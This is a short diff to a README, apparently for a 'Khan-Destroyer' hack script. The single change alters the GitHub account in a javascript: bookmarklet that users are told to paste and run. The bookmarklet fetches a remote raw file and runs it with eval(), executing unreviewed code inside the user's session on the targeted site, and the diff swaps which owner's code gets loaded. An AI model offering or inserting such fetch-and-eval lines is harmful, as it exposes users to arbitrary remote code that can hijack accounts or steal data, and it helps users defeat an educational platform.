@@ -30,7 +30,7 @@
 # Hack/script (copy)
 ⚠️ **ACTIVATE COMPUTER MODE TO USE ON CELL PHONE**⚠️
 ```js
-javascript:fetch("https://raw.githubusercontent.com/Snowxyrzk/Khan-Destroyer/refs/heads/main/Raw").then(t=>t.text()).then(eval);
+javascript:fetch("https://raw.githubusercontent.com/meisticc/Khan-Destroyer/refs/heads/main/Raw").then(t=>t.text()).then(eval);
 ```
 # IF YOU TRY TO USE IT WITHOUT ACTIVE COMPUTER MODE IT WILL NOT WORK!!!!⚠️
 
